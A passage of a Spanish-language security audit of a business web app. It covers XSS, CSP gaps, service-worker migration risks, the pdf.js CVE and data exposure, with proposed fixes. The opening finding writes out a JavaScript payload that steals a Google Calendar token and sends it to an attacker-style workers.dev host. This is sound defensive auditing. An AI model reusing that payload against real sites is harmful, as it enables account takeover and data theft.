El XSS ya confirmado del cotizador (index.html:9352, 9403-9405, 9530, con `g.clave` metido dentro de un `onclick`) corre en el mismo origen que la plataforma. Desde ahí: `import('/js/nucleo/gcal.js').then(g => g.pedirToken(true)).then(r => fetch('https://x.cuenta-ajena.workers.dev/?t=' + r.valor.token))`. La CSP no lo estorba: `script-src` lleva 'unsafe-inline' y el import dinámico es 'self'; el destino cae dentro de `https://*.workers.dev` de `connect-src` (_headers:74). No hay pantalla de consentimiento porque `prompt:''` es silencioso. El resultado es un Bearer de una hora, usable desde cualquier máquina, con lectura y escritura sobre la agenda personal completa del director — no sobre las instalaciones de AL3D, sobre todo lo que tenga en Google Calendar. Y como `desconectar()` no revoca, el permiso sigue vivo aunque se cierre la pestaña; se quita solo entrando a la cuenta de Google.

**Arreglo.** Tres cosas, la primera es la que corta el caso: (1) que `pedirToken` deje de devolver el token. `llamar()` (gcal.js:319) usa `_tok.token` del ámbito del módulo, no lo que la promesa devuelve, así que cambiar las dos líneas por `return ok({ expira: _tok.expira })` (gcal.js:135) y `resolve(ok({ expira: _tok.expira }))` (gcal.js:164) no rompe nada y deja el token sin salir nunca del módulo. Verifícalo también en `conectar()` (gcal.js:177-180), que ya devuelve solo el correo. (2) Poner `if (!puedeEscribir()) return mal('ROL_SIN_PERMISO', MSG.ROL);` al principio de `pedirToken`, junto al `if (!c.clientId)` de la línea 134.

**De severidad media:**

- **urlMapa() no filtra el esquema: un javascript: en maps_url ejecuta código al tocar «Abrir en Maps» en la ficha de proyecto** — `js/mod/proyectos.js:742-749 (urlMapa) y js/mod/proyectos.js:676 (el <a href>)`  
  Copiar la guarda de agenda.js:566 a js/mod/proyectos.js:743: if (/^https?:\/\//i.test(String(p.maps_url || ''))) return String(p.maps_url); Y de paso cerrar el origen: en index.html:6642, guardar Q.maps solo si pasa /^https?:\/\//i (o guardarlo vacío y avisar), para que el valor sucio no llegue nunca al buzón ni al…
- **`connect-src ... https://*.workers.dev` deja abierto un destino de exfiltración que cualquiera se registra gratis en dos minutos, y el propio _headers vende connect-src como la defensa que sí queda** — `_headers:74 (la directiva) frente a _headers:37-42 (lo que el archivo promete)`  
  Hoy, cero código: corregir el texto de _headers:37-40 para que no prometa lo que no da mientras el comodín esté puesto — una frase del tipo «ojo: `*.workers.dev` es un comodín sobre un dominio en el que cualquiera puede registrar un subdominio gratis, así que hoy connect-src NO impide que un dato se vaya».
- **`al3d_pf_ganadas` viaja dentro del respaldo del cotizador —contra lo que prefs.js declara— y restaurarlo la BORRA antes de escribir** — `index.html:9554 y index.html:9681, contra js/datos/prefs.js:14-19`  
  Decidir cuál de las dos cosas es la verdad y dejar que el código y el comentario digan lo mismo, que hoy se contradicen. Si el invariante de prefs.js:14-19 es el bueno: quitar `'al3d_pf_ganadas'` de index.html:9554 — una palabra— y aceptar que un «se ganó» sin drenar no cruza de teléfono (que es lo correcto, porque…
- **«Borrar de verdad» dice «Se borró todo» y no toca ni un dato del cotizador: el historial completo de clientes y las llaves de IA se quedan en el mismo origen** — `js/mod/ajustes.js:1170-1176 y :1188-1196`  
  Dos partes, y la segunda es la que importa. (1) Corregir el texto: `cabeza('Se borró todo')` de ajustes.js:1192 tiene que decir «Se borró la plataforma» y el cuerpo tiene que nombrar lo que NO se borró, con la ruta para hacerlo a mano (Chrome Android → ⋮ → Configuración del sitio → el dominio → Borrar datos; iOS →…
- **El .ics de «bajar todas» mete en un solo archivo el nombre, el teléfono y la dirección de todos los clientes con instalación viva, y está hecho para salir por WhatsApp** — `js/mod/agenda.js:793-800 (bajarVarias) y js/datos/agenda.js:716-741 (paraIcs)`  
  El .ics de UNA instalación ya existe dos funciones más arriba (agenda.js:731) y es el que el instalador necesita: solo el suyo, con su cliente. El de «todas» es para el calendario del propio director.
- **«Quién autorizó» es un campo de texto libre precargado con el nombre del autorizador anterior, y si se deja vacío la app estampa ese nombre igual** — `index.html:5784 y index.html:6386-6389`  
  Tres cambios de una línea cada uno en index.html. (1) Quitar la precarga: `value="${esc(Q.autorizador||'')}"` en la línea 5784, dejando `prefGet(PREF_AUTORIZADOR,'')` solo como `placeholder`, para que se vea la sugerencia pero haya que teclearla.

**Lo demás, una línea cada uno:**

| | Qué | Dónde |
|---|---|---|
| baja | Los dos restaurar validan la FORMA de un respaldo pero nunca el CONTENIDO de sus campos | `index.html:9632-9695 (restaurarDesde) y js/datos/db.js:` |
| baja | El Client ID de Google se cachea para toda la vida de la pestaña: corregir uno mal pegado en Ajustes no surte efecto hasta recargar la app | `js/nucleo/gcal.js:146-154 y js/mod/ajustes.js:855-876` |
| baja | pedirToken no registra error_callback ni tiene tiempo de espera: si Google no llama al callback, la promesa nunca se resuelve y el botón queda muerto sin decir nada | `js/nucleo/gcal.js:142-171 (la promesa) y js/nucleo/gcal` |
| informativa | Los 267 manejadores on*="" de index.html hacen imposible la CSP que taparía el hallazgo 1 | `index.html (267 atributos on*), index.html:8783 (el <sc` |

### El service worker y la mudanza

*9 hallazgos: 1 crítica · 2 medias · 5 bajas · 1 informativa.*

#### [crítica] Al mudarse de origen, los teléfonos se quedan atrapados en github.io con TODOS los datos del negocio adentro

`sw.js:210-218 (plataforma cache-first) + index.html:11751 + js/app.js:410 (register('sw.js')) + manifest.webmanifest y manifest-plataforma.webmanifest (scope './')`

Publicas en Cloudflare y le mandas el enlace nuevo a los tres. El ícono viejo de la pantalla de inicio sigue apuntando a github.io. Ahí el SW viejo sigue vivo y sirve la plataforma DESDE LA CACHÉ sin preguntarle a nadie, así que aunque apagues GitHub Pages la app vieja abre igual, en la calle, delante del cliente, y deja capturar. Fabricación cotiza en el ícono viejo y dirección en el nuevo; los folios se duplican porque cada origen lleva su propio `al3d_folio`. Nadie ve un error: las dos apps se ven idénticas. El día que alguien por fin borra el ícono viejo, se lleva el historial, los cuadernos de clientes y la cola de autorización de ese teléfono, porque el respaldo nunca se hizo.

**Arreglo.** Procedimiento exacto, en cuatro fases. NO empieces por publicar en Cloudflare. FASE 0 — rescatar los datos (antes de tocar nada) 1. En CADA uno de los tres teléfonos, con la app vieja abierta: Historial → botón «Respaldar» (index.html:3412) para el cotizador, y Ajustes → «Respaldar» para la plataforma. Son DOS archivos distintos y no se cruzan (lo dice js/mod/ajustes.js:368). Guarda los seis archivos fuera del teléfono. 2. Anota qué token del puente tiene cada teléfono y con qué rol, y qué API keys de IA tiene pegadas: el respaldo NO las incluye (index.html:3421, ajustes.js:618). FASE 1 — levantar el origen nuevo SIN apagar el viejo 3. Publica en Cloudflare Pages con DOMINIO PROPIO (p. ej. **El verificador matiza:** Dos ajustes al procedimiento, ninguno lo tumba. (a) El paso 14 está inflado: `"id": "/cotizador-al3d/plataforma"` no rompe nada en Cloudflare —el `id` de un manifiesto es una cadena de identidad, no una ruta que tenga que existir— así que es higiene, no un fallo de la mudanza; cámbialo si vas a tocar el archivo, no como paso bloqueante.

**De severidad media:**

- **Un teléfono se queda pegado en la versión vieja PARA SIEMPRE si falta un solo archivo de APP_FILES, y no hay forma de notarlo** — `sw.js:117-162 (el throw de la línea 159) y sw.js:45-80 (APP_FILES)`  
  Tres cosas, por orden de valor: 1. Que la app diga su versión. Exponerla del SW a la página con un `message` (`self.registration.active.postMessage`) o, más simple, escribir APP_VERSION también en js/app.js y pintarla en Ajustes junto al «Último respaldo» que ya existe (ajustes.js:338).
- **pdf.js se carga desde cdnjs sin SRI, en dos lugares, y con acceso total al origen** — `index.html:10369-10370 y index.html:12082-12083`  
  1. Añadir SRI a las cuatro líneas: `s.integrity='sha384-...'; s.crossOrigin='anonymous';` en 10369 y 12082, con el hash real de pdf.js 3.11.174 tomado de la propia página de cdnjs.

**Lo demás, una línea cada uno:**

| | Qué | Dónde |
|---|---|---|
| baja | No hay kill switch: si se publica un sw.js roto, no se puede apagar desde ningún panel | `sw.js (todo el archivo) — no existe ninguna llamada a r` |
| baja | En Cloudflare, «red primero» del cotizador pasa a ser «edge primero»: la garantía de sw.js:249-252 deja de ser cierta | `sw.js:249-259` |
| baja | Si el puente se pone en el mismo dominio (lo natural en Cloudflare), el SW empieza a guardar datos de clientes y dinero en el Cache Storage | `sw.js:197 y sw.js:253-259; puente/worker.js:348-364; pu` |
| baja | plataforma() escribe en la caché versionada al fallar el match, justo lo que el propio archivo declara que no hace | `sw.js:219-224 y sw.js:203-209` |
| baja | revalidar() no hace lo que su comentario promete: un fetch desde dentro del SW no dispara la revisión de sw.js | `sw.js:213-216 y sw.js:238-247` |
| informativa | El SW no toca ningún otro origen ni ninguna respuesta opaca: esto está bien y hay que escribirlo para que siga así | `sw.js:183-201` |

### Cloudflare y la mudanza

*19 hallazgos: 1 crítica · 1 alta · 3 medias · 8 bajas · 6 informativas.*

#### [crítica] Cambiar de github.io a pages.dev deja los tres teléfonos con la app vacía: IndexedDB y localStorage no cruzan de origen

`js/datos/db.js:22 y index.html:9580`

Publicas en Pages, mandas el link nuevo por WhatsApp, los tres lo abren. El cotizador arranca sin historial, sin logotipo, con `al3d_folio` en cero — o sea que el siguiente folio que emita CHOCA con uno que ya se le entregó a un cliente — y sin la API key de IA. La plataforma abre con la base `al3d_pf` recién creada y vacía: sin proyectos, sin agenda, sin el libro del almacén, y con la bandeja de pendientes del puente en blanco (lo que estuviera sin mandar a Notion se pierde y nadie se entera, porque la bandeja vacía se ve igual que la bandeja al día). Además los dos PWA instalados en la pantalla de inicio siguen apuntando al origen viejo: quedan dos apps con el mismo icono y datos distintos.

**Arreglo.** ANTES de tocar Cloudflare, en cada uno de los tres teléfonos y todavía en github.io: (1) cotizador → Ajustes → descargar `cotizador-al3d-respaldo-*.json` (index.html:9619); (2) plataforma → Ajustes → tarjeta Respaldo (js/mod/ajustes.js:325-352) → descargar el suyo. Son DOS archivos distintos y no se cruzan, lo dice la propia pantalla (ajustes.js:368). Guardarlos fuera del teléfono. **El verificador matiza:** Añadir un paso que el hallazgo omite y que rompe el mismo día: js/nucleo/gcal.js:462 pide registrar `location.origin` en «Orígenes autorizados de JavaScript» de Google Cloud. Al cambiar a pages.dev, Google Calendar devuelve origin_mismatch hasta que se dé de alta el origen nuevo en console.cloud.google.com. Va junto con el cambio de ORIGENES del Worker, no después.

#### [alta] La variable ORIGENES del Worker sigue diciendo github.io: el día que publiques en Pages, el puente rechaza a los tres teléfonos

`puente/worker.js:137 y puente/README.md:63`

Publicas en Pages, un teléfono abre la plataforma, `js/datos/puente.js` intenta el bombeo automático y el navegador bloquea la respuesta por CORS. La pantalla no dice «CORS»: dice lo que dice el runbook (README.md:150). Lo pendiente se queda en la bandeja acumulándose, nadie ve un error rojo, y el espejo del dinero simplemente deja de bajar. Se descubre días después, cuando alguien nota que un proyecto no llegó a Notion.

**Arreglo.** En el MISMO paso en que publiques en Pages: dash.cloudflare.com → Workers & Pages → puente-al3d → Settings → **Variables and Secrets** → editar `ORIGENES` (tipo Text) y poner los orígenes separados por coma, sin barra final: `https://cotizador-al3d.pages.dev` durante la transición añade también el viejo — `https://eliasgaribi-ctrl-z.github.io,https://cotizador-al3d.pages.dev` — y quita el de github.io cuando los tres teléfonos ya migraron. Después de guardar hay que volver a desplegar el Worker para que tome la variable. Y ojo con lo que CORS no es: no es autenticación. **El verificador matiza:** Añadir que hay un tercer lugar que hay que tocar el mismo día y no se ve desde Cloudflare: js/datos/puente.js:619 le dicta al usuario el valor de ORIGENES a partir de `location.origin` (puente.js:604), así que la pantalla de Ajustes ya dirá el valor nuevo — pero el Worker sigue con el viejo hasta que alguien lo edite y REDESPLIEGUE. Guardar la variable sin redesplegar es el error clásico de este paso.

**De severidad media:**

- **docs/, README.md, pruebas/ y puente/worker.js se sirven completos al público, y ahí está el dinero del negocio** — `docs/LO-QUE-YA-EXISTE.md:29, docs/ESTRUCTURA-COTIZACION-CANVA.md:126, docs/diseno/prop-google-nativo.md:23`  
  Es el momento de arreglarlo, porque Pages sí permite separar lo publicable de lo que no. Workers & Pages → cotizador-al3d → Settings → Builds → **Build command**: `mkdir -p _publico && cp -r index.html plataforma.html sw.js css js vendor datos .nojekyll *.webmanifest *.png _publico/` · **Build output directory**:…
- **Poner la plataforma detrás de Cloudflare Access no la protege: la destruye en los teléfonos que ya la tienen** — `sw.js:117-127 y sw.js:210-236`  
  NO poner Access sobre el sitio. Ni sobre `/plataforma.html`, ni sobre `/js/*`, ni sobre `/`. La app no tiene secreto que Access proteja: los datos del negocio están en el IndexedDB de cada teléfono, no en el servidor, y lo que se sirve es código que ya es público en GitHub.
- **DNS y dominio propio: el orden importa, y hay tres cosas fuera de Cloudflare que se rompen si se olvidan** — `js/nucleo/gcal.js:449 y js/datos/puente.js:604`  
  En este orden exacto. (1) dash.cloudflare.com → **Add a domain** → `al3d.mx` → plan **Free**. (2) Cloudflare te da dos servidores de nombres; cambiarlos en el registrador donde compraste el dominio. Esperar a que la zona diga **Active** (minutos a 24 h).

**Lo demás, una línea cada uno:**

| | Qué | Dónde |
|---|---|---|
| baja | Rocket Loader rompería index.html de forma intermitente y difícil de diagnosticar | `index.html (1 solo <script>, 267 manejadores on*) y ind` |
| baja | SSL/TLS: Full (strict), Always Use HTTPS y TLS mínimo 1.2 — sin riesgo de romper nada en este sitio | `configuración de Cloudflare (SSL/TLS)` |
| baja | HSTS sí, pero preload no — y menos con includeSubDomains sobre un dominio del que dependen los tres teléfonos | `configuración de Cloudflare (SSL/TLS → Edge Certificate` |
| baja | El Worker del puente vive en workers.dev, donde no hay WAF ni rate limiting posibles | `puente/README.md:53 y puente/worker.js:157-165` |
| baja | El puente no tiene rate limiting de ningún tipo y la vía gratuita para ponérselo exige elegir entre panel y wrangler | `puente/worker.js:302-441` |
| baja | Secretos del Worker: los dos que importan van encriptados, y falta el procedimiento de rotación de TOKENS | `puente/README.md:58-63 y puente/worker.js:40-47` |
| baja | Workers Logs del puente: enciéndelo, pero nunca registres la cabecera Authorization | `puente/worker.js:157-165 y worker.js:442-446` |
| baja | El id del manifest de la plataforma quedará fuera del scope al servirse desde la raíz | `manifest-plataforma.webmanifest:2` |
| informativa | Para este repo conviene Cloudflare Pages, no Workers Static Assets, y la configuración exacta es de cuatro campos | `plataforma.html:162-166 y .nojekyll` |
| informativa | Ninguna purga de Cloudflare arregla el problema de publicación de este proyecto: la purga que importa es APP_VERSION | `sw.js:33 y sw.js:210-218` |
| informativa | Bot Fight Mode inyecta un script en el HTML que el service worker guarda y sirve días después sin señal | `sw.js:253-259 (función cotizador)` |
| informativa | Cloudflare Access sí vale la pena — pero encima de las vistas previa, no de la app | `configuración de Cloudflare (Pages → Settings → General` |
| informativa | Cloudflare Web Analytics inyecta un script de terceros en un HTML que el service worker cachea — y aquí no compra casi nada | `sw.js:257 y configuración de Cloudflare` |
| informativa | Las reglas gestionadas gratuitas del WAF: enciéndelas, pero sabiendo que no son lo que protege a este proyecto | `configuración de Cloudflare (Security → WAF)` |

### De dónde viene el código y a dónde salen los datos

*13 hallazgos: 5 altas · 3 medias · 4 bajas · 1 informativa.*

#### [alta] pdf.js 3.11.174 desde cdnjs abre los PDF que manda el cliente: versión con ejecución de JavaScript arbitrario

`index.html:10369-10370 y index.html:12082-12083`

pdf.js quedó parchado contra CVE-2024-4367 en la versión 4.2.67. La 3.11.174 es anterior. El fallo está en el manejo de fuentes Type1 incrustadas: el campo `FontMatrix` no se sanea y termina en un `Function()` que pdf.js construye porque `isEvalSupported` viene en `true` por omisión. Un PDF preparado ejecuta JavaScript en el origen del sitio. Aquí eso significa: un cliente manda por WhatsApp un «plano» en PDF, el vendedor lo arrastra al escalador o al vectorizador, y ese PDF corre código con acceso total a `localStorage` (las API keys de OpenRouter/Groq/Gemini, `al3d_pf_puente` con el token de dispositivo del Worker de Notion, `al3d_pf_gcal`) y a IndexedDB (proyectos, clientes, teléfonos, direcciones, movimientos de almacén). Con el token del puente se escribe en Notion con el rol de ese teléfono.

**Arreglo.** Auto-hospedar pdf.js. Bajar la build 4.x o 5.x oficial (`pdfjs-dist/build/pdf.min.mjs` y `pdf.worker.min.mjs`) a `vendor/pdfjs/`, apuntar las cuatro líneas ahí, y añadir los dos archivos a `APP_FILES` en sw.js. En la llamada, pasar además `getDocument({data:ab, isEvalSupported:false})` como cinturón. Subir de versión sin auto-hospedar arregla el CVE pero deja vivo el hallazgo siguiente. **El verificador matiza:** El arreglo tal como está escrito rompe cosas. NO metas pdf.min.js + pdf.worker.min.js en APP_FILES: son ~1.4 MB y `APP_FILES` se instala con `addAll`, que es todo-o-nada por diseño (sw.js:44-46 y el comentario de install en sw.js:100-110). Hoy el lector de PDF se descarga solo cuando alguien abre un PDF, con un mensaje explícito de que necesita señal la primera vez (index.html:10369, el `s.onerror`).

#### [alta] docs/ se publica con el sitio: UUIDs de Notion, $3.7M de facturación, nombres de clientes reales y las cuentas bancarias

`docs/LO-QUE-YA-EXISTE.md (y todo docs/, 688 KB)`

Cualquiera que abra https://.../cotizador-al3d/docs/LO-QUE-YA-EXISTE.md lo lee, sin sesión y sin cuenta de GitHub. Google lo indexa: no hay robots.txt y los .md se sirven como texto plano. Un competidor obtiene la tabla de precios, el volumen facturado y la lista de clientes de tres años en una sola URL. Alguien que quiera hacerse pasar por AL3D con un cliente concreto ya tiene el nombre del proyecto, el negocio y el importe. Y esto sobrevive a hacer el repo privado: Cloudflare Pages va a subir exactamente los mismos archivos que hoy sube Pages, porque el problema no es la visibilidad del repo, es qué se despliega.

**Arreglo.** En Cloudflare Pages, Build settings → añadir un paso de build que copie a `dist/` solo lo que sirve el sitio, o —más simple sin tocar la estructura— crear `.cloudflareignore`… que no existe. La vía real: poner un comando de build (`mkdir -p dist && cp -r index.html plataforma.html sw.js manifest*.webmanifest logo-*.png css js vendor datos dist/`) con Output directory `dist`. Eso deja fuera docs/, pruebas/, herramientas/, puente/ y README.md de un tirón. Aparte, revisar si esos números y nombres de clientes tienen que estar escritos en el repo en absoluto. **El verificador matiza:** El comando de build propuesto tiene un agujero que borra todo el trabajo de seguridad de este repo: `cp -r index.html plataforma.html sw.js manifest*.webmanifest logo-*.png css js vendor datos dist/` NO copia `_headers` ni `robots.txt`. Cloudflare Pages lee `_headers` del directorio de salida, no de la raíz del repo. Si publicas ese dist/, el sitio nuevo sale SIN CSP, SIN HSTS, SIN X-Frame-Options y sin noindex — o sea peor que hoy.

#### [alta] Apagar GitHub Pages a secas deja la plataforma viva para siempre: el service worker es caché-primero

`sw.js:210-215 (función `plataforma`) y sw.js:252-262 (función `cotizador`)`

Si se prende Cloudflare Pages y se apaga GitHub Pages sin más: el cotizador de github.io empieza a devolver el 404 de GitHub y se rompe a la vista (eso está bien, se nota). Pero la plataforma sigue arrancando perfecta desde la caché `al3d-app-<APP_VERSION>`, indefinidamente, en cada teléfono donde esté instalada. Los tres empleados pueden pasarse semanas registrando instalaciones, movimientos de almacén y ventas ganadas en un sitio que ya no existe, cuyos datos viven en el IndexedDB del origen github.io y no se ven desde pages.dev. Nadie va a notar nada raro: la app se ve idéntica, funciona sin señal por diseño, y el icono en la pantalla de inicio es el mismo. El día que alguien lo descubra habrá dos verdades divergentes del almacén y de la agenda.

**Arreglo.** En orden, y sin saltarse el paso 1. (1) Publicar en main, con Pages TODAVÍA PRENDIDO, un `sw.js` lápida: subir `APP_VERSION`, vaciar `APP_FILES`, y en `activate` hacer `await caches.keys().then(ks=>Promise.all(ks.map(k=>caches.delete(k))))` seguido de `self.registration.unregister()` y `clients.matchAll().then(cs=>cs.forEach(c=>c.navigate('https://<nuevo-dominio>/plataforma.html')))`; en index.html y plataforma.html, un aviso grande: «esta dirección se mudó, respalda y abre la nueva». (2) Con cada uno de los tres teléfonos, con señal: abrir la app vieja, bajar el respaldo del cotizador y el de la plataforma, confirmar que la lápida se activó y que la app quedó desinstalada. **El verificador matiza:** Un paso de la receta de la lápida NO va a funcionar: `clients.matchAll().then(cs=>cs.forEach(c=>c.navigate('https://<nuevo-dominio>/...')))`. `WindowClient.navigate()` solo acepta URLs del MISMO origen; con una URL cruzada la promesa se rechaza con TypeError y el usuario no se entera de nada. Quita ese paso.

#### [alta] El respaldo de la plataforma no incluye localStorage ni la bandeja de salida: mudarse de origen pierde el token del puente y las operaciones sin enviar

`js/datos/db.js:301-313, js/app.js:273-284, js/datos/prefs.js:23-31`

IndexedDB y localStorage son por origen. `https://eliasgaribi-ctrl-z.github.io` y `https://cotizador-al3d.pages.dev` (o el dominio propio) son orígenes distintos: cero datos compartidos, sin excepción, sin migración automática. Se restaura el respaldo en el sitio nuevo y parece que todo llegó —proyectos, instalaciones, materiales, movimientos, geo, blobs—, pero silenciosamente falta: el rol del dispositivo, la URL y el token del puente (hay que volver a pegar los tres, uno por teléfono, y quien los generó fue `tokensNuevos()` en js/datos/puente.js:641, así que si nadie los apuntó hay que regenerar los tres y actualizar la variable TOKENS del Worker), el Client ID de Google Calendar, la empresa, las cotizaciones marcadas como ganadas (`al3d_pf_ganadas`), y las API keys de IA de los tres proveedores.

**Arreglo.** Antes de mudar, en cada teléfono: abrir Ajustes y confirmar que la bandeja de pendientes está en cero (esperar señal si no). Apuntar en papel, por dispositivo, el rol, la URL del Worker y el token del puente. Después de restaurar en el sitio nuevo: volver a pegar token del puente, Client ID de Calendar, datos de empresa y las API keys de IA. Lo de `al3d_pf_ganadas` no tiene atajo: hay que revisar qué cotizaciones estaban marcadas como ganadas y volver a marcarlas. A futuro, que `exportar()` incluya un bloque `prefs` con todo `al3d_pf_*` menos `PUENTE` y `GCAL` (esos son secretos y no deben viajar en un JSON que se manda por WhatsApp). **El verificador matiza:** El detalle que falta en la lista de lo que hay que re-pegar: el rol y la URL del puente se pueden apuntar en papel, pero el token de dispositivo NO se puede leer de la pantalla después de generado — `tokensNuevos()` (js/datos/puente.js:641) los muestra una sola vez y puente/README.md:74 lo dice: «Los tres se ven una sola vez».

#### [alta] ORIGENES del puente apunta al github.io viejo, y el Worker no rechaza a nadie por origen

`puente/worker.js:136-141 y 302-309`

Dos cosas distintas. La operativa, inmediata: al publicar en Cloudflare Pages el origen cambia, deja de estar en `ORIGENES`, el Worker responde con `Access-Control-Allow-Origin: https://eliasgaribi-ctrl-z.github.io`, el navegador lo rechaza y la sincronización con Notion deja de funcionar en los tres teléfonos el mismo día de la mudanza, con un mensaje que no va a decir «CORS» sino algo genérico. La de seguridad: el chequeo de origen no protege nada, porque el Worker procesa la petición igual y devuelve el cuerpo; solo el navegador la corta. Un `curl` con el token de dispositivo escribe en Notion sin que el origen importe.

**Arreglo.** Antes de la mudanza: en el panel del Worker, Settings → Variables, poner `ORIGENES` = el dominio nuevo, a secas. NO dejar el github.io en la lista «por si acaso»: eso mantiene vivo el sitio zombie del otro hallazgo. Y cambiar `origenPermitido` para que rechace de verdad: si hay cabecera `Origin` y no está en la lista, devolver 403 antes de tocar Notion. No cierra el agujero de curl (nada lo cierra salvo el token), pero deja de fingir que sí. Si algún día se sospecha de un teléfono, rotar su entrada en `TOKENS` es un cambio de variable y un pegado nuevo. **El verificador matiza:** Verifica primero si `ORIGENES` está siquiera definida en las variables del Worker: si nunca se puso, hoy está corriendo con el valor por omisión de worker.js:137 y la rotura es segura; si alguien ya la puso, el diagnóstico cambia. Y una advertencia sobre el 403 propuesto: rechazar cuando hay cabecera `Origin` y no está en la lista es correcto, pero NO rechaces cuando no hay cabecera `Origin` — las peticiones que no vienen de un navegador (un `curl` de diagnóstico, `/salud`) no la mandan, y si…

**De severidad media:**

- **Sin SRI en cdnjs, y el worker de pdf.js no se puede firmar ni aunque se quisiera** — `index.html:10369-10370, index.html:12082-12083`  
  Es el mismo arreglo que el hallazgo anterior y por eso conviene hacerlo una sola vez: auto-hospedar. Con los dos archivos en `vendor/pdfjs/` desaparece cdnjs de la lista de orígenes y el CSP puede quedar `script-src 'self' 'unsafe-inline'` (el `unsafe-inline` sigue haciendo falta por los 267 manejadores `on*=` de…
- **El repositorio es público — verificado, no supuesto** — `github.com/eliasgaribi-ctrl-z/cotizador-al3d`  
  Sí conviene privado, y el argumento no es técnico: es que la facturación, los clientes y la regla de precios de un negocio real están publicados y no hay ninguna razón para que lo estén. Settings → General → Change repository visibility → Private.
- **La lista de precios completa de AL3D sale a OpenRouter en cada análisis, y el modelo por omisión es un `:free`** — `index.html:6801 (dentro de PROMPT_IA, que empieza en 6765), index.html:7309, index.html:7424-7426`  
  Tres cosas. (1) Cambiar el modelo por omisión de OpenRouter a uno de pago, o quitar OpenRouter y dejar Groq como respaldo de Gemini; si se conserva OpenRouter con `:free`, decirlo en la propia pantalla de Ajustes junto al campo de la key, no en un documento.

**Lo demás, una línea cada uno:**

| | Qué | Dónde |
|---|---|---|
| baja | La API key de Gemini viaja en la query string, no en cabecera | `index.html:7416` |
| baja | La dirección literal del cliente sale a Nominatim con el correo del dueño pegado en cada consulta | `js/datos/geo.js:248-255` |
| baja | Google Fonts: en cada carga en frío se filtra IP, User-Agent y la URL completa de la página | `index.html:7-8 y 15-16; plataforma.html:30-33` |
| baja | vendor/leaflet-src.esm.js no tiene procedencia verificable: nadie puede comprobar hoy que sea el archivo oficial | `vendor/leaflet-src.esm.js (424 545 bytes)` |
| informativa | pruebas/ y herramientas/ se publican con el sitio: 208 KB que dibujan el mapa completo de la app | `pruebas/ (184 KB, 17 archivos), herramientas/ (24 KB, 3` |

### Llaves, respaldos y datos de clientes

*12 hallazgos: 4 medias · 7 bajas · 1 informativa.*

**De severidad media:**

- **En GitHub Pages todo AL3D vive en un origen compartido con cualquier otro repo del usuario** — `index.html:6888 y js/datos/prefs.js:66`  
  Es exactamente lo que arregla mudarse a Cloudflare Pages, si se hace bien: cada proyecto de Pages vive en su propio subdominio (cotizador-al3d.pages.dev), que es un origen distinto de cualquier otro proyecto. Mejor todavía: dominio propio (cotizador.al3d.mx) y ahí no se comparte con nada.
- **pdf.js se baja de cdnjs sin SRI y corre con acceso total a las keys y al historial** — `index.html:10369`  
  Autoalojar pdf.js en vendor/ como ya se hizo con Leaflet (es lo más limpio: también arregla el 'se necesita conexión para leer un PDF' del propio mensaje de error). Si se prefiere dejar la CDN, agregar integrity="sha384-…" y crossorigin="anonymous" a los dos <script> y usar la ruta local para workerSrc.
- **El respaldo sí deja fuera las keys —el README dice la verdad—, pero se lleva la cartera entera sin cifrar** — `index.html:9554`  
  Cifrar el respaldo con una contraseña antes de escribirlo: WebCrypto (PBKDF2 sobre una frase + AES-GCM) son unas 40 líneas y ya está en todos los navegadores que la app soporta. El archivo sale como .json cifrado y restaurarDesde pide la frase.
- **No existe aviso de privacidad en ningún lado, y la app trata todo lo que la LFPDPPP considera dato personal** — `index.html:8886`  
  Proporcionado para tres personas: (1) una página privacidad.html de una sola pantalla —quién es el responsable, qué se recaba (nombre, teléfono, domicilio, ubicación, fotos del sitio), para qué (cotizar, fabricar, instalar y cobrar), a quién se transfiere (Notion/Cloudflare, los proveedores de IA, OpenStreetMap, el…

**Lo demás, una línea cada uno:**

| | Qué | Dónde |
|---|---|---|
| baja | La key de Gemini viaja en la URL: se lee sin tocar localStorage | `index.html:7416` |
| baja | El token del puente se guarda en claro y se manda a la URL que diga localStorage, sin lista blanca | `js/datos/puente.js:301` |
| baja | Una key de OpenRouter en el teléfono es dinero del dueño, y el límite se pone del lado del proveedor | `index.html:6870` |
| baja | Las fotos del local del cliente se suben a planes gratuitos de IA | `index.html:7428` |
| baja | Cada dirección de cliente se manda a Nominatim con un correo personal quemado en el código | `js/datos/geo.js:250` |
| baja | Los CSV sacan la lista completa de clientes a un archivo suelto sin advertir nada | `index.html:9498` |
| baja | La orden de trabajo por WhatsApp entrega el expediente del cliente a alguien que no usa el sistema | `js/datos/reglas.js:845` |
| informativa | Un comentario de db.js afirma una ofuscación del token del puente que no existe | `js/datos/db.js:293` |

### Las cabeceras y la CSP

*2 hallazgos: 2 bajas.*

**Lo demás, una línea cada uno:**

| | Qué | Dónde |
|---|---|---|
| baja | La URL del puente la escribe el usuario y NO se valida el host: una CSP con https://*.workers.dev rompe cualquier otro dominio | `js/datos/puente.js:270 y js/datos/puente.js:301` |
| baja | aiTraerDeUrl hace fetch a CUALQUIER https:// arrastrado desde otra página: connect-src acotado mata la función | `index.html:7223-7231` |

---

## Lo que se revisó y está bien

Esta sección existe para que no se vuelva a auditar. Cada línea se comprobó contra el código,
no contra la memoria.

- **No hay ningún `<form>`, `<base>`, `<object>`, `<embed>`, `<audio>` ni `<video>` en todo el
  repositorio.** Por eso `form-action`, `base-uri`, `object-src` y `media-src` se pueden
  cerrar del todo sin romper nada, y así están.
- **El service worker no toca ningún otro origen ni guarda ninguna respuesta opaca.** Las
  teselas del mapa no se cachean a propósito —archivarlas viola la política de uso de
  OpenStreetMap— y eso está dicho con palabras en la pantalla, no escondido.
- **Responder el preflight `OPTIONS` antes de validar el token es correcto** y no debe
  cambiarse: un preflight que pidiera credenciales no es un preflight.
- **Falta `Access-Control-Allow-Credentials` en el Worker, y no hace falta.** El token viaja
  en `Authorization`, no en una cookie. Agregarlo empeoraría las cosas.
- **`linkWa()` arma la URL de WhatsApp desde los dígitos del teléfono** y descarta todo lo
  demás, así que nunca tuvo el problema de `urlMapa()`. Ahora tiene prueba para que siga sin
  tenerlo.
- **`csvCampo()` desactiva la inyección de fórmulas** en los CSV exportados anteponiendo un
  apóstrofo a lo que empieza con `=`, `+`, `-`, `@` o tabulador, con la excepción bien pensada
  de los números puros para que los totales sigan sumando en la hoja de cálculo. Es un detalle
  que casi nadie cuida.
- **El token de Google Calendar no se guarda en `localStorage`**, vive en memoria y dura una
  hora. Está razonado en `js/nucleo/gcal.js:29-33`, y el precedente que cita —la API key que
  acabó en un respaldo mandado por WhatsApp— es de este mismo proyecto.
- **El prompt que se manda a la IA no lleva datos del cliente**, solo la imagen.
- **Las API keys de IA no entran en el respaldo.** El README lo dice y el código lo cumple:
